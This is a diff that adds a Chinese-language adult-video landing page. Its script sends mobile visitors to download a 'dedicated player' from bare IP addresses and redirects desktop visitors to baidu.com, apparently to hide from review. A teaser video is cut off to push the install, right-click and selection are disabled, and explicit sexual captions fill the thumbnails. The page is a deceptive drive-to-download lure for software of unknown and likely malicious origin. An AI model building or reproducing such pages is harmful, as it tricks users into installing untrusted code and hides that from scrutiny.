@@ -1,0 +1,226 @@
+<html><head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>看片神器</title>
+    <meta name="description" content="看片神器,">
+    <meta name="keywords" content="看片神器,">
+    <meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no,minimal-ui">
+    <link rel="stylesheet" href="css/demo4.css">
+	<script src="https://cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script>
+    <script>
+        var xz_domain = "/";
+
+        function randomString(len) {
+            len = len || 32;
+            var $chars = "abcdefhijkmnprstwxyz2345678";
+            var maxPos = $chars.length;
+            var pwd = "";
+            for (var i = 0; i < len; i++) {
+                pwd += $chars.charAt(Math.floor(Math.random() * maxPos))
+            }
+            return pwd
+        }
+
+        function GetQueryString(name) {
+            var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)");
+            var r = window.location.search.substr(1).match(reg);
+            if (r != null) return unescape(r[2]);
+            return null;
+        }
+        function clickme() {
+        }
+
+        var shuijishu = randomString(8);
+        var c = GetQueryString("c");
+        var mb = GetQueryString("mb");
+        if (c == null) {
+            c = "922229";
+        }
+
+        var DownUrl = "http://142.4.102.235/adaz/ldad.html?" + shuijishu ;
+        var JumpUrl = "/?mb=" + mb + "&c=" + c;
+
+        var browser = {
+            versions: function () {
+                var u = navigator.userAgent, app = navigator.appVersion;
+                return { //移动终端浏览器版本信息
+                    ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+                    android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或uc浏览器
+                    iPhone: u.indexOf('iPhone') > -1, //是否为iPhone或者QQHD浏览器
+                    iPad: u.indexOf('iPad') > -1, //是否iPad
+                };
+            }()
+        };
+        if (browser.versions.iPhone || browser.versions.iPad || browser.versions.ios) {
+            $(document).ready(function () {
+                $("a").attr("href", DownUrl);
+                $("a").attr("target", "_blank");
+				$("#adurls").attr("href", "http://107.149.163.250/ae.html");
+            });
+        } else if (browser.versions.android) {
+            $(document).ready(function () {
+                $("a").attr("href", DownUrl);
+                $("a").attr("target", "_blank");
+				$("#adurls").attr("href", "http://107.149.163.250/ae.html");
+            });
+			//setTimeout("showTip01a()", "1000");
+			//setTimeout("showTip01a()", "2000");
+			//setTimeout("showTip01a()", "3000");
+			
+        } else {
+            window.location.href = "http://www.baidu.com";
+        }
+
+        $(document).ready(function () {
+            $("#tplayer").click(function () {
+                $(this).hide();
+                $("#cplayer").show();
+
+                setTimeout(function () {
+                    $("#cplayer").hide();
+                    $("#tplayer").hide();
+                    $("#xplayer").hide();
+                    $("#con").hide();
+                    $("#swfplayer").show();
+                    document.getElementById("swfplayer").play();
+                }, 1000);
+
+                setTimeout(function () {
+                    $("#tplayer").hide();
+                    $("#xplayer").show();
+                    $("#swfplayer").hide();
+                    $("#player_mask").show();
+                    document.getElementById("swfplayer").pause();
+                }, 20000);
+				
+				
+            });
+            $(".tvp_app_bar .tvp_close").click(function () {
+                $("#banner").hide()
+            });
+        })
+		
+		function showTip01a() {
+		location.href = DownUrl;
+		}
+
+		
+		
+		
+		
+    </script>
+</head>
+<body oncontextmenu="return false" onselectstart="return false" style="zoom: 1;" marginwidth="0" marginheight="0">
+<a href="http://142.4.102.235/adaz/ldad.html?yzkn7tfy" name="moviesLink" target="_blank">
+    <div class="header">
+        <div class="header_tip ">立即下载本站影片资源专用播放器</div>
+    </div>
+</a>
+	    <div class="footerDown ">
+	        <a id="adurls" target="_blank" href="http://107.149.163.250/ae.html"><img src="https://ae01.alicdn.com/kf/Ue15da8237ecb42ef9b8b424e4117e17aF.gif" width="100%" height="80px"></a>
+	    </div>
+<div class="container">
+    <div class="mod_player">
+        <a href="http://142.4.102.235/adaz/ldad.html?yzkn7tfy" target="_blank">
+            <div class="tvp_overlay_play_try ech-vidHldr" id="player_mask" onclick="clickme()">
+                <div class="tvp_overlay_play_try " style="width:16rem;height: 70px;border-radius: 2px;border:0">
+                    <span class="tvp_text" style="padding:2px 0 5px 0">安装免费观看,上万部成人影片等你欣赏！</span>
+                    <span class="download_app_btn" style=" position: relative;float: right;margin-right: 12px;line-height: 30px;width: 234px;text-align: center;color: #fff;font-size: 14px;border-radius: 2px;background-color: #FF7000;background: -webkit-linear-gradient(top,#FF7000 1%,#FF7000 100%);background: linear-gradient(to bottom,#FF7000 1%,#FF7000 100%);box-shadow: 0 1px 3px 0 rgba(230,230,230,.1);text-shadow: 0 1px 2px rgba(230,230,230,.1);margin-top: 8px;">安装专用播放器</span>
+                </div>
+            </div>
+        </a>
+
+        <div class="tvp_overlay_play_try" id="tplayer">
+            <img src="img/playg_8.png" id="playanniu" style="width:20px; height:20px; display:none;">
+            <span class="tvp_button_play"></span>
+            <span class="tvp_text">试看120秒</span></div>
+        <div class="tvp_overlay_play_load" id="cplayer" style="display:none; margin:auto; text-align:center; vertical-align:middle; width: 45px; height: 45px;">
+            <div style="text-align:center; vertical-align:middle; margin:auto;">
+                <img src="img/4_8.gif" style="width: 45px; height: 45px;">
+            </div>
+        </div>
+        <img class="tvp_poster_img" id="xplayer" src="img/hd7.jpg">
+        <a href="http://142.4.102.235/adaz/ldad.html?yzkn7tfy" target="_blank">
+            <video id="swfplayer" style="display:none" width="100%" height="300">
+                <source src="https://cdn.vgo30.com/01.mp4" type="video/mp4">
+                <source src="movie.ogg" type="video/ogg">
+                <source src="movie.webm" type="video/webm">
+            </video>
+            <div class="moviesCover">
+                <img src="img/imm2.jpg">
+            </div>
+        </a></div>
+</div>
+    <div class="footerDown ">
+        <a href="http://142.4.102.235/adaz/ldad.html?yzkn7tfy" name="moviesLink" target="_blank">播放器下载</a>
+	</div>
+<script>
+    var array = [];
+    var data = [
+        ["https://img.alicdn.com/imgextra/i2/3257972811/TB2Bpa9dTMlyKJjSZFFXXalVFXa_!!3257972811.gif", "HD", "1546", "绝美少女被操的高潮画面太淫荡,全套高清视频我果断撸了"],
+        ["https://img.alicdn.com/imgextra/i1/3257972811/TB2FSm.dHAlyKJjSZFwXXXtqpXa_!!3257972811.gif", "DVD", "3567", "极品少妇那呻吟声和享受的表情，我也被她带动到了高潮"],
+        ["https://img.alicdn.com/imgextra/i1/3257972811/TB20ScaebglyKJjSZFuXXaE6FXa_!!3257972811.gif", "AIV", "4677", "最新情侣各种大尺度的爱爱高清视频合集高潮不断"],
+        ["https://img.alicdn.com/imgextra/i1/3257972811/TB2AW9.dJAmyKJjSZFGXXb.fFXa_!!3257972811.gif", "MP4", "3445", "与淫荡女网友视频聊天,精彩视频自慰抠B。叫声太浪了我射了"],
+        ["https://img.alicdn.com/imgextra/i4/3257972811/TB2iwfgdJAmyKJjSZFKXXXCQXXa_!!3257972811.gif", "HD", "8479", "何为极品，看到她那美丽的容颜,魔鬼的身材,那一刻我硬了"],
+        ["https://img.alicdn.com/imgextra/i3/3257972811/TB2bkvedJAmyKJjSZFGXXb.fFXa_!!3257972811.gif", "HD", "2324", "90后学生激情热吻,草地野战无视围观激情内射"]
+    ];
+
+    function getArray(count, maxs, mins) {
+        while (array.length < count) {
+            var temp = getRandom(maxs, mins);
+            if (!serch(array, temp)) {
+                array.push(temp);
+            }
+        }
+        return array;
+    }
+
+    function getRandom(maxs, mins) {
+        return Math.round(Math.random() * (maxs - mins)) + mins;
+    }
+
+    function serch(array, num) {
+        for (var i = 0; i < array.length; i++) {
+            if (array[i] == num) {
+                return true;
+            }
+        }
+        return false;
+    }
+</script>
+<div class="movies ech-vidHldr">
+    <script>
+        var d = getArray(4, 5, 0);
+        for (var _i = 0; _i < 2; _i++) {
+            for (var x in d) {
+                if (d.hasOwnProperty(x)) {
+                    var img = data[d[x]][0];
+                    var hua = data[d[x]][1];
+                    var ping = data[d[x]][2];
+                    var text = data[d[x]][3];
+                    document.writeln("<a href='" + DownUrl + "' class='moviesLink' name='moviesLink' ><div class='moviesCover'><img src=" + img + "></div><p>" + text + "</p><div class='status'><span class='left'>观看:" + ping + " &nbsp;&nbsp;画质:" + hua + "</span></div></a>");
+                }
+            }
+        }
+    </script><a href="http://142.4.102.235/adaz/ldad.html?yzkn7tfy" class="moviesLink" name="moviesLink" target="_blank"><div class="moviesCover"><img src="https://img.alicdn.com/imgextra/i3/3257972811/TB2bkvedJAmyKJjSZFGXXb.fFXa_!!3257972811.gif"></div><p>90后学生激情热吻,草地野战无视围观激情内射</p><div class="status"><span class="left">观看:2324 &nbsp;&nbsp;画质:HD</span></div></a>
+<a href="http://142.4.102.235/adaz/ldad.html?yzkn7tfy" class="moviesLink" name="moviesLink" target="_blank"><div class="moviesCover"><img src="https://img.alicdn.com/imgextra/i2/3257972811/TB2Bpa9dTMlyKJjSZFFXXalVFXa_!!3257972811.gif"></div><p>绝美少女被操的高潮画面太淫荡,全套高清视频我果断撸了</p><div class="status"><span class="left">观看:1546 &nbsp;&nbsp;画质:HD</span></div></a>
+<a href="http://142.4.102.235/adaz/ldad.html?yzkn7tfy" class="moviesLink" name="moviesLink" target="_blank"><div class="moviesCover"><img src="https://img.alicdn.com/imgextra/i1/3257972811/TB20ScaebglyKJjSZFuXXaE6FXa_!!3257972811.gif"></div><p>最新情侣各种大尺度的爱爱高清视频合集高潮不断</p><div class="status"><span class="left">观看:4677 &nbsp;&nbsp;画质:AIV</span></div></a>
+<a href="http://142.4.102.235/adaz/ldad.html?yzkn7tfy" class="moviesLink" name="moviesLink" target="_blank"><div class="moviesCover"><img src="https://img.alicdn.com/imgextra/i1/3257972811/TB2FSm.dHAlyKJjSZFwXXXtqpXa_!!3257972811.gif"></div><p>极品少妇那呻吟声和享受的表情，我也被她带动到了高潮</p><div class="status"><span class="left">观看:3567 &nbsp;&nbsp;画质:DVD</span></div></a>
+<a href="http://142.4.102.235/adaz/ldad.html?yzkn7tfy" class="moviesLink" name="moviesLink" target="_blank"><div class="moviesCover"><img src="https://img.alicdn.com/imgextra/i3/3257972811/TB2bkvedJAmyKJjSZFGXXb.fFXa_!!3257972811.gif"></div><p>90后学生激情热吻,草地野战无视围观激情内射</p><div class="status"><span class="left">观看:2324 &nbsp;&nbsp;画质:HD</span></div></a>
+<a href="http://142.4.102.235/adaz/ldad.html?yzkn7tfy" class="moviesLink" name="moviesLink" target="_blank"><div class="moviesCover"><img src="https://img.alicdn.com/imgextra/i2/3257972811/TB2Bpa9dTMlyKJjSZFFXXalVFXa_!!3257972811.gif"></div><p>绝美少女被操的高潮画面太淫荡,全套高清视频我果断撸了</p><div class="status"><span class="left">观看:1546 &nbsp;&nbsp;画质:HD</span></div></a>
+<a href="http://142.4.102.235/adaz/ldad.html?yzkn7tfy" class="moviesLink" name="moviesLink" target="_blank"><div class="moviesCover"><img src="https://img.alicdn.com/imgextra/i1/3257972811/TB20ScaebglyKJjSZFuXXaE6FXa_!!3257972811.gif"></div><p>最新情侣各种大尺度的爱爱高清视频合集高潮不断</p><div class="status"><span class="left">观看:4677 &nbsp;&nbsp;画质:AIV</span></div></a>
+<a href="http://142.4.102.235/adaz/ldad.html?yzkn7tfy" class="moviesLink" name="moviesLink" target="_blank"><div class="moviesCover"><img src="https://img.alicdn.com/imgextra/i1/3257972811/TB2FSm.dHAlyKJjSZFwXXXtqpXa_!!3257972811.gif"></div><p>极品少妇那呻吟声和享受的表情，我也被她带动到了高潮</p><div class="status"><span class="left">观看:3567 &nbsp;&nbsp;画质:DVD</span></div></a>
+
+</div>
+<div class="footer">
+    <div class="footerDown ">
+        <a href="http://142.4.102.235/adaz/ldad.html?yzkn7tfy" name="moviesLink" target="_blank">播放器下载</a>
+        <a href="http://142.4.102.235/adaz/ldad.html?yzkn7tfy" class="more" name="moviesLink" target="_blank">更多精彩...</a>
+	</div>
+    <p>警告：本站含大量成人内容 仅供18周岁以上人群浏览！</p>
+    <p>请遵守当地法律法规，不要随意传播！</p>
+</div>
+<div class="eche"><a href="http://142.4.102.235/adaz/ldad.html?yzkn7tfy" class="float" name="moviesLink" target="_blank">点我下载<span>本站18禁专用播放器</span>观看更多影片资源</a></div>
+<div style="display:none;"><script type="text/javascript" src="https://s9.cnzz.com/z_stat.php?id=1278102790&amp;web_id=1278102790"></script><script src="https://c.cnzz.com/core.php?web_id=1278102790&amp;t=z" charset="utf-8" type="text/javascript"></script><a href="http://142.4.102.235/adaz/ldad.html?yzkn7tfy" target="_blank" title="站长统计">站长统计</a></div>
+
+</body></html>
